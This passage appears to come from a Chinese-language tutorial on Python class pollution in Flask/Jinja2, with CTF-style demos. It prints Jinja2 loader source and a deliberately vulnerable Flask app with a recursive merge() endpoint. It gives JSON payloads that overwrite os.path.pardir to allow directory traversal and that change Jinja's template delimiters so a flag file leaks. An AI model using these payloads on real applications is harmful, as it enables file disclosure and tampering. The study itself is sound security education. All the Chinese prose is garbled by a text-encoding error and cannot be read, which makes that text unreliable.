</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë∑üËøõget_sourceÂáΩÊï∞ÔºåÊù•Âà∞<code>Lib/site-packages/jinja2/loaders.py</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_source</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="p">,</span> <span class="n">environment</span><span class="p">:</span> <span class="s2">&#34;Environment&#34;</span><span class="p">,</span> <span class="n">template</span><span class="p">:</span> <span class="nb">str</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="o">-&gt;</span> <span class="n">t</span><span class="o">.</span><span class="n">Tuple</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">str</span><span class="p">,</span> <span class="n">t</span><span class="o">.</span><span class="n">Callable</span><span class="p">[[],</span> <span class="nb">bool</span><span class="p">]]:</span>
</span></span><span class="line"><span class="cl">        <span class="n">pieces</span> <span class="o">=</span> <span class="n">split_template_path</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">searchpath</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">searchpath</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Use posixpath even on Windows to avoid &#34;drive:&#34; or UNC</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># segments breaking out of the search directory.</span>
</span></span><span class="line"><span class="cl">            <span class="n">filename</span> <span class="o">=</span> <span class="n">posixpath</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">searchpath</span><span class="p">,</span> <span class="o">*</span><span class="n">pieces</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="n">TemplateNotFound</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">encoding</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">contents</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">mtime</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getmtime</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">def</span> <span class="nf">uptodate</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">getmtime</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span> <span class="o">==</span> <span class="n">mtime</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">OSError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Use normpath to convert Windows altsep to sep.</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">contents</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">normpath</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="n">uptodate</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë∑üËøõsplit_template_pathÂáΩÊï∞</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">split_template_path</span><span class="p">(</span><span class="n">template</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">t</span><span class="o">.</span><span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Split a path into segments and perform a sanity check.  If it detects
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#39;..&#39; in the path it will raise a `TemplateNotFound` error.
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">pieces</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">piece</span> <span class="ow">in</span> <span class="n">template</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">sep</span> <span class="ow">in</span> <span class="n">piece</span>
</span></span><span class="line"><span class="cl">            <span class="ow">or</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">altsep</span> <span class="ow">and</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">altsep</span> <span class="ow">in</span> <span class="n">piece</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="ow">or</span> <span class="n">piece</span> <span class="o">==</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">pardir</span><span class="c1">#34Ë°å</span>
</span></span><span class="line"><span class="cl">        <span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="n">TemplateNotFound</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">piece</span> <span class="ow">and</span> <span class="n">piece</span> <span class="o">!=</span> <span class="s2">&#34;.&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">pieces</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">piece</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pieces</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁªìÂêàÂáΩÊï∞Ê≥®ÈáäÂèØ‰ª•‰∫ÜËß£Âà∞Ëøô‰∏™ÂáΩÊï∞Â∞Ü‰ºöÊää‰º†ÂÖ•ÁöÑÊ®°ÊùøË∑ØÂæÑÊåâÁÖß<code>/</code>ËøõË°åÂàÜÂâ≤ÔºåÂú®34Ë°åÁöÑÈÄªËæëÂà§Êñ≠‰∏äÂÜ≥ÂÆö‰∫ÜÔºàÂÖ∂‰ΩôÁöÑÈÉ®ÂàÜÈÄªËæëÂÄºÂü∫Êú¨‰∏∫ÂÅáÔºâÊï¥‰∏™<code>if</code>ËØ≠Âè•ÊòØÂê¶‰∏∫ÁúüÔºåÊòæÁÑ∂ÈúÄË¶ÅÊîπËØ≠Âè•‰∏∫ÂÅáÈÅøÂÖçËß¶Âèë36Ë°åÁöÑ<code>raise</code>„ÄÇ34Ë°å‰∏≠ÁöÑ<code>os.path.pardir</code>ÂÄºÂç≥‰∏∫<code>..</code>ÔºåÊâÄ‰ª•Âè™Ë¶Å‰øÆÊîπËØ•Â±ûÊÄß‰∏∫‰ªªÊÑèÂÖ∂‰ªñÂÄºÂç≥ÂèØÈÅøÂÖçÊä•ÈîôÔºå‰ªéËÄåÂÆûÁé∞<code>render_template</code>ÂáΩÊï∞ÁöÑÁõÆÂΩïÁ©øË∂ä</p>
<p>ËøôÈáåÊîπÊàê<code>,</code></p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;os&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;path&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;pardir&#34;</span><span class="p">:</span><span class="s2">&#34;,&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéÂ∞±ÂèØ‰ª•ÁõÆÂΩïÁ©øË∂ä‰∫Ü</p>
<h2 id="jinjaËØ≠Ê≥ïÊ†áËØÜÁ¨¶">JinjaËØ≠Ê≥ïÊ†áËØÜÁ¨¶
</h2><p>Âú®ÈªòËÆ§ÁöÑËßÑÂàôËßÑÂàô‰∏ãÔºåÂ∏∏Áî®<code>Jinja</code>ËØ≠Ê≥ïÊ†áËØÜÁ¨¶Êúâ<code>{{ Code }}</code>„ÄÅ<code>{% Code %}</code>„ÄÅ<code>{# Code #}</code>ÔºåÂΩìÁÑ∂ÂØπ‰∫éÊàë‰ª¨ÈúÄË¶Å<code>RCE</code>ÁöÑÈúÄÊ±ÇÊù•ËØ¥ÔºåÈÄöÂ∏∏Ââç‰∏§ËÄÖÊâçÈúÄË¶ÅÁïôÊÑè„ÄÇËÄå<code>Flask</code>ÂÆòÊñπÊñáÊ°£‰∏≠ÊòéÁ°ÆÂëäÁü•‰∫ÜÔºåËøô‰∫õËØ≠Ê≥ïÊ†áËØÜÁ¨¶ÂùáÊòØÂèØ‰ª•‰æùÁÖß<code>Jinja</code>‰∏≠‰øÆÊîπÁöÑ</p>
<p>Âú®<code>Jinja</code>ÊñáÊ°£‰∏≠Â±ïÁ§∫‰∫ÜÂØπËøô‰∫õËØ≠Ê≥ïÊ†áËØÜÁ¨¶ËøõË°åÊõøÊç¢ÁöÑÊñπÊ≥ïÔºö<a class="link" href="https://jinja.palletsprojects.com/en/3.1.x/api/#jinja2.Environment"  target="_blank" rel="noopener"
    >API ‚Äî Jinja Documentation (3.1.x) (palletsprojects.com)</a>ÔºåÂç≥ÂØπ<code>Jinja</code>ÁöÑÁéØÂ¢ÉÁ±ªÁöÑÁõ∏ÂÖ≥Â±ûÊÄßËµãÂÄºÔºåÊñáÊ°£‰∏≠ÊèêÂà∞ËØ¥ÔºåÂ¶ÇÊûúÊ≠§Á±ªÁöÑÂÆû‰æãÊú™ÂÖ±‰∫´Âπ∂‰∏îÂ∞öÊú™Âä†ËΩΩÊ®°ÊùøÁöÑËØùÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•‰øÆÊîπÊ≠§Á±ªÁöÑÂÆû‰æã</p>
<p>ËÄåÂú®<code>Flask</code>‰∏≠‰ΩøÁî®‰∫Ü<code>Flask</code>Á±ªÔºà<code>Lib/site-packages/flask/app.py</code>ÔºâÁöÑË£ÖÈ•∞Âô®Ë£ÖÈ•∞ÂêéÁöÑ<code>jinja_env</code>ÊñπÊ≥ïÂÆûÁé∞‰∏äËø∞ÁöÑÂäüËÉΩÔºõÁªèËøáË£ÖÈ•∞Âô®ÁöÑË£ÖÈ•∞ÂêéÔºåÁÆÄÂçïÊù•ËØ¥ÂèØ‰ª•Â∞ÜËØ•ÊñπÊ≥ïËßÜ‰∏∫Â±ûÊÄßÔºåÂØπËØ•ÊñπÊ≥ïÁöÑËé∑ÂèñÂ∞±ËÉΩÂÆûÁé∞ÊñπÊ≥ïË∞ÉÁî®ÔºåÁ±ª‰ºº<code>Flask.jinja_env</code>Â∞±Áõ∏ÂΩì‰∫é<code>Flask.jinja_env()</code>„ÄÇ</p>
<p>Ë∑üËøõÂÖ∂‰∏≠Ë∞ÉÁî®ÁöÑ<code>create_jinja_environment</code>ÔºåÁªìÂêàÊ≥®ÈáäÂ∞±ÂèØ‰ª•ÂèëÁé∞<code>jinja_env</code>ÊñπÊ≥ïËøîÂõûÂÄºÂ∞±ÊòØ<code>Jinja</code>‰∏≠ÁöÑÁéØÂ¢ÉÁ±ªÔºàÂÆûÈôÖ‰∏äÊòØÂØπÂéüÁîüÁöÑ<code>Jinja</code>ÁéØÂ¢ÉÁ±ªÂÅö‰∫ÜÁªßÊâøÔºå‰∏çËøáÂú®‰ΩøÁî®‰∏äÂπ∂Êó†Â§öÂ§ßÂå∫Âà´ÔºâÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•Áõ¥Êé•ÈááÁî®Á±ª‰ºº<code>Flask.jinja_env.variable_start_string = &quot;xxx&quot;</code>Êù•ÂÆûÁé∞ÂØπ<code>Jinja</code>ËØ≠Ê≥ïÊ†áËØÜÁ¨¶ËøõË°åÊõøÊç¢</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">#templates/index.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Look this -&gt; [[flag]] <span class="p">&lt;</span><span class="nt">-</span> <span class="na">try</span> <span class="na">to</span> <span class="na">make</span> <span class="na">it</span> <span class="na">become</span> <span class="na">the</span> <span class="na">real</span> <span class="na">flag</span><span class="err">&lt;/</span><span class="na">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>    
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#app.py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span><span class="p">,</span><span class="n">render_template</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">merge</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">),</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;go check /index before merge it&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/index&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">templates</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;test.html&#34;</span><span class="p">,</span> <span class="n">flag</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;rt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËÆøÈóÆ<code>index</code>Ë∑ØÁî±‰ºöÁªôÊ®°ÊùøÂ°´ÂÖÖ<code>flag</code>ÂèòÈáèÁöÑÂÄºÔºå‰ΩÜÊòØÈúÄË¶ÅÂ∫îËØ•Ë¶ÅËØ≠Ê≥ïÊ†áËØÜÁ¨¶ÊòØ<code>{{flag}}</code>Ôºå‰ΩÜËøôÈáåÊòØ<code>[[flag]]</code>ÊòØÊó†Ê≥ïË¢´Ëß£ÊûêÁöÑ</p>
<p>Êàë‰ª¨ÊÉ≥Ë¶ÅÈÄöËøá{{flag}}ÁöÑËØùÔºåÂ∞±ÈúÄË¶ÅÂ∞ÜËØ≠Ê≥ïÊ†áËØÜÁ¨¶ËøõË°åÊõøÊç¢ÔºåËøôÈáåÊàë‰ª¨Â∞±Â∞ÜËØ≠Ê≥ïÊ†áËØÜÁ¨¶‰ªé{{}}ÔºåÊõøÊç¢‰∏∫[[]]ËøôÊ†∑ÁöÑËØùÔºå[[flag]]Â∞±ËÉΩÂ§üÂÉè{{flag}}‰∏ÄÊ†∑Ë¢´Ëß£Êûê‰∫Ü„ÄÇ</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;app&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;jinja_env&#34;</span> <span class="p">:{</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;variable_start_string&#34;</span> <span class="p">:</span> <span class="s2">&#34;[[&#34;</span><span class="p">,</span><span class="s2">&#34;variable_end_string&#34;</span><span class="p">:</span><span class="s2">&#34;]]&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>        
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰ΩÜÊòØÂú®FlaskÊ°ÜÊû∂ÂΩì‰∏≠ÔºåÂÆÉ‰ºöÂØπÊ®°ÊùøÊñá‰ª∂ÁºñËØëÂêéËøõË°å‰∏ÄÂÆöÁöÑÁºìÂ≠òÔºå‰∏ãÊ¨°ÂÜçÈúÄË¶ÅÊ∏≤ÊüìÁöÑÊó∂ÂÄôÔºåÁõ¥Êé•‰ΩøÁî®ÁºìÂ≠òÈáåÈù¢ÁöÑÊ®°ÊùøÊñá‰ª∂ÔºåËøôÊ†∑ÁöÑËØùÊàë‰ª¨‰øÆÊîπÂêéËØ≠Ê≥ïÊ†áËØÜÁ¨¶ÈáåÈù¢ÁöÑflagÂèòÈáèÂπ∂Ê≤°ÊúâË¢´ÊîæÂà∞ÁºìÂ≠òÂΩì‰∏≠ÔºåÊâÄ‰ª•Ê≤°ÊúâËá™Âä®Â°´ÂÖÖflagÔºåÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÂú®FlaskÂêØÂä®‰ª•ÂêéÂÖàËæìÂÖ•payloadÂÜçËÆøÈóÆË∑ØÁî±ÔºåËøôÊ†∑Â∞±ÂèØ‰ª•ÂÅöÂà∞ÂÖàÊ±°ÊüìÂÜçËÆøÈóÆÊ®°Êùø</p>
<p>ÊâÄ‰ª•Âè™ÈúÄÊàë‰ª¨Âú®<code>Flask</code>ÊúçÂä°ÂêØÂä®ÂêéÔºàÂΩìÁÑ∂ËøôÈáåÊºîÁ§∫Â∞±ÊòØÈáçÂêØ‰∏ã<code>Flask</code>ÊúçÂä°Â∞±Ë°å‰∫ÜÔºåÂØπ‰∫éÈ¢òÁõÆÊù•ËØ¥‰∏ÄËà¨Â∞±ÊòØÈáçÂêØÂÆπÂô®ÔºåÊàñÊòØÂú®Ê±°Êüì‰πãÂêéÂÜçËÆøÈóÆÊ®°ÊùøÔºâÂÖàËæìÂÖ•<code>payload</code>ÂÜçËÆøÈóÆ<code>index</code>Ë∑ØÁî±Âç≥ÂèØ</p>
<h2 id="jinjaËØ≠Ê≥ïÂÖ®Â±ÄÊï∞ÊçÆ">jinjaËØ≠Ê≥ïÂÖ®Â±ÄÊï∞ÊçÆ
</h2><p>ÂÆûÈôÖ‰∏äÂåÖÊã¨ÂáΩÊï∞„ÄÅÂèòÈáè„ÄÅËøáÊª§Âô®Ëøô‰∏âËÄÖÈÉΩËÉΩË¢´Ëá™ÂÆö‰πâÁöÑÊ∑ªÂä†Âà∞<code>Jinja</code>ËØ≠Ê≥ïËß£ÊûêÊó∂ÁöÑÁéØÂ¢ÉÔºåÊìç‰ΩúÊñπÂºè‰∫é<code>Jinja</code>ËØ≠Ê≥ïÊ†áËØÜÁ¨¶‰∏≠ÂÆåÂÖ®Á±ª‰ºº</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">#templates/index.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>{{flag if permission else &#34;No way!&#34;}}<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>    
